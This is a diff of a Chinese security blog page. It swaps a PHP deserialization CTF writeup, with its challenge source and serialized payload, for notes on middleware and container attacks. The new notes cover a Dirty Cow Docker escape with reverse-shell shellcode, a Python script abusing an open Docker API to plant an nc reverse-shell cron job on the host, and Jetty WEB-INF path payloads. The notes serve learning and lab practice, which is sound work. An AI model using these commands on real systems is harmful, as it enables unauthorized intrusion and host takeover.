+<li>由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271，CVE-2020-15257</li>
+<li>由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</li>
+<li>CVE-2016-5195</li>
+</ul>
+<h3 id="9-1、利用Dirty-Cow实现Docker逃逸"><a href="#9-1、利用Dirty-Cow实现Docker逃逸" class="headerlink" title="9.1、利用Dirty Cow实现Docker逃逸"></a>9.1、利用Dirty Cow实现Docker逃逸</h3><p> 在 Linux 中，有一个功能：<strong>VDSO(virtual dvnamic shared object)</strong>, 这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。</p>
+<p>​        Docker 逃逸利用 Dirty Cow 漏洞，将 Payload 写到 VDSO 中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个 Shellcode。Shellcode 初始化时会检测是否被 root 所调用，如果调用，则继续执行，如果没有调用则返回，并执行 <code>clock_gettime</code> 函数，接下来它会检测 /tmp/.X 文件的存在，如果存在，则这时已经是 root 权限了，然后它会打开一个反向的 TCP 链接，为 Shellcode 中填写的 ip 返回一个 Shell。</p>
+<p><strong>获得权限后实现逃逸：</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># exp：https://github.com/gebl/dirtycow-docker-vdso</span>
+<span class="token comment"># 使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test</span>
+<span class="token comment"># 其中 test：为临时名称，可以自定义填写。 -p： 第一个端口为本机的端口，第二个端口为Docker的端口。 -itd：意思是在后台运行，交互式运行，并且输出当前的信息 /bin/bash：调用Shell</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+<span class="token function">docker</span> run --name<span class="token operator">=</span>test -p <span class="token number">1234</span>:1234 -itd dirtycow /bin/bash 
 
-    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+<span class="token comment"># 进入镜像内部</span>
+<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it <span class="token builtin class-name">test</span> /bin/bash
 
-    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<span class="token comment"># 将poc的ip改为容器的ip，make编译poc并运行 poc</span>
+<span class="token builtin class-name">cd</span> /dirtycow-vdso/  
+<span class="token function">make</span>   
+./0xdeadbeef       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<h3 id="9-2、docker未授权访问漏洞"><a href="#9-2、docker未授权访问漏洞" class="headerlink" title="9.2、docker未授权访问漏洞"></a>9.2、docker未授权访问漏洞</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> docker
 
-    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
-            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+client <span class="token operator">=</span> docker<span class="token punctuation">.</span>DockerClient<span class="token punctuation">(</span>base_url<span class="token operator">=</span><span class="token string">'http://目标IP:2375/'</span><span class="token punctuation">)</span>
 
-<span class="token punctuation">&#125;</span>
+data <span class="token operator">=</span> client<span class="token punctuation">.</span>containers<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'alpine:latest'</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">r'''sh -c "echo '* * * * * /usr/bin/nc 反弹IP 端口 -e /bin/sh' >> /tmp/etc/crontabs/root" '''</span><span class="token punctuation">,</span> remove<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> volumes<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'/etc'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'bind'</span><span class="token punctuation">:</span> <span class="token string">'/tmp/etc'</span><span class="token punctuation">,</span> <span class="token string">'mode'</span><span class="token punctuation">:</span> <span class="token string">'rw'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 
-<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
+<span class="token comment"># 监听：反弹端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<p>参考：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/docker/unauthorized-rce/">https://vulhub.org/#/environments/docker/unauthorized-rce/</a></p>
+<h2 id="10、Jetty"><a href="#10、Jetty" class="headerlink" title="10、Jetty"></a>10、Jetty</h2><p> Jetty 是一个<strong>开源的servlet容器</strong>，它为<strong>基于Java的web容器</strong>，例如JSP和servlet提供运行环境</p>
+<h3 id="10-1、Jetty-WEB-INF敏感信息泄露漏洞分析"><a href="#10-1、Jetty-WEB-INF敏感信息泄露漏洞分析" class="headerlink" title="10.1、Jetty WEB-INF敏感信息泄露漏洞分析"></a>10.1、Jetty WEB-INF敏感信息泄露漏洞分析</h3><p><strong>CVE-2021-28164</strong></p>
+<p>影响版本：9.4.37 </p>
+<p>已在版本 9.4.39 中修复</p>
+<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;%2e&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+<p><strong>CVE-2021-28169</strong></p>
+<p>在版本 9.4.40、10.0.2、11.0.2 之前， <code>ConcatServlet</code>和 <code>WelcomeFilter</code> <strong>Jetty Servlet</strong> 中的类受双重解码错误的影响。  如果开发者手动使用这两个类，攻击者可以利用它们下载<strong>WEB-INF</strong>目录下的任意敏感文件</p>
+<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;static?&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>CVE-2021-34429</strong></p>
+<p><strong>Jetty 9.4.40</strong> 修复了一个模糊路径信息泄露漏洞 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164">CVE-2021-28164 </a>，CVE-2021-34429 是它的变种和绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;%u002e&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>writeup：</strong></p>
-<p><strong>分析:</strong></p>
-<ol>
-<li>根据题目及源码中unserialize()判断此题考查反序列化</li>
-</ol>
-<p>  <img src="https://img-blog.csdnimg.cn/20210429224110400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ol start="2">
-<li><p>flag存储在flag.php中</p>
-<p><img src="https://img-blog.csdnimg.cn/20210429224125343.jpg" alt="在这里插入图片描述"></p>
-</li>
-</ol>
-<ol start="3">
-<li><p>题目中有两个魔术方法： <strong>construct()、destruct()</strong></p>
-<p> <img src="https://img-blog.csdnimg.cn/20210429224136782.jpg" alt="在这里插入图片描述"></p>
-</li>
-</ol>
-<p>  <img src="https://img-blog.csdnimg.cn/20210429224149702.jpg" alt="在这里插入图片描述"></p>
-<ol start="4">
-<li>destruct()中会调用process,且op=1写入,op=2读取</li>
-</ol>
-<p>  <img src="https://img-blog.csdnimg.cn/20210429224243312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>  <img src="https://img-blog.csdnimg.cn/20210429224323475.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ol start="5">
-<li>涉及对象FileHandler,变量op及filename,content,进行构造输出.</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
-class FileHandler &#123;
 
-    public $op&#x3D;&#39; 2&#39;;
-    public $filename&#x3D;&#39;flag.php&#39;;
-    public $content&#x3D;&#39;jaa&#39;;                 &#x2F;&#x2F;变量content不涉及题目可随意填写
-&#125;
-$flag &#x3D; new FileHandler();
-$flag_1 &#x3D; serialize($flag);
-echo $flag_1;
-    
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>涉及:反序列化魔术方法调用，弱类型绕过,ascii绕过</strong></p>
-<ol>
-<li><p><code>使用该类对flag进行读取,这里面能利用的只有__destruct函数(析构函数)。__destruct函数对this-&gt;op进行了===判断并内容在2字符串时会赋值为1.</code></p>
-<p><code>procesa函数中使用==对$this-&gt;op进行判断(为2的情况下才能读取内容),因此这里存在弱类型比较,可以使用数字2或``字符串&#39; 2&#39;绕过判断。</code></p>
-</li>
-</ol>
-<p><img src="https://img-blog.csdnimg.cn/20210429224343769.jpg" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210429224403987.jpg" alt="在这里插入图片描述"></p>
-<ol start="2">
-<li><code>is_valid函数还对序列化字符串进行了校验，因为成员被protected修饰,因此序列化字符串中会出现ascii为0的字符。经过测试,在PHP7.2+的环境中,使用publie修饰成员并序列化,反序列化后成员也会被public覆盖修饰。</code></li>
-</ol>
-<p><strong>实操:</strong></p>
-<p>上述步骤5构造输出:</p>
-<p><img src="https://img-blog.csdnimg.cn/20210429224418905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>得到序列化后的字符串</p>
-<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p>
-<p>将该字符串传递给参数str并在url中以GET方式进行传参</p>
-<p><code>https://IP/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p>
-<p>之后查看源代码得到flag.</p>
-<p><img src="https://img-blog.csdnimg.cn/20210429224441269.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
                 
             </div>
@@ -756,7 +766,7 @@ echo $flag_1;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/01/15/php-fan-xu-lie-hua/">http://jaasenyi.github.io/2022/01/15/php-fan-xu-lie-hua/</a>
+                    <a href="http://jaasenyi.github.io/2022/05/20/ser-zhong-jian-jian-an-quan/">http://jaasenyi.github.io/2022/05/20/ser-zhong-jian-jian-an-quan/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -794,16 +804,12 @@ echo $flag_1;
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
+                                <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                                    <span class="chip bg-color">中间件</span>
                                 </a>
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/PHP/">
-                                    <span class="chip bg-color">PHP</span>
+                                <a href="/tags/%E5%AE%B9%E5%99%A8/">
+                                    <span class="chip bg-color">容器</span>
                                 </a>
                             
                         </div>
@@ -1243,88 +1249,35 @@ echo $flag_1;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/15/luo-ji-yue-quan/">
+                <a href="/2022/05/20/ser-zhong-jian-jian-an-quan/">
                     <div class="card-image">
                         
+                        <img src="/medias/banner/server.jpeg" class="responsive-img" alt="服务安全-中间件&amp;容器">
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="逻辑越权介绍">
-                        
-                        <span class="card-title">逻辑越权介绍</span>
+                        <span class="card-title">服务安全-中间件&amp;容器</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    web漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                    <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">逻辑漏洞</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/01/15/php-fan-xu-lie-hua/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="php反序列化">
-                        
-                        <span class="card-title">php反序列化</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
+                            Nginx，Apache，Tomcat，Weblogic，JBoos，Jenkin，GlassFish，Webshere，Docker，Jetty
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    web漏洞
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="post-category">
+                                    服务安全
                                 </a>
                             
                             
@@ -1335,16 +1288,60 @@ echo $flag_1;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
+                        <span class="chip bg-color">中间件</span>
                     </a>
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E5%AE%B9%E5%99%A8/">
+                        <span class="chip bg-color">容器</span>
                     </a>
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/05/09/java-anoandrel/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/banner/AnoandRel.jpeg" class="responsive-img" alt="Java-注解与反射">
+                        
+                        <span class="card-title">Java-注解与反射</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java%E7%AF%87/" class="post-category">
+                                    Java篇
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
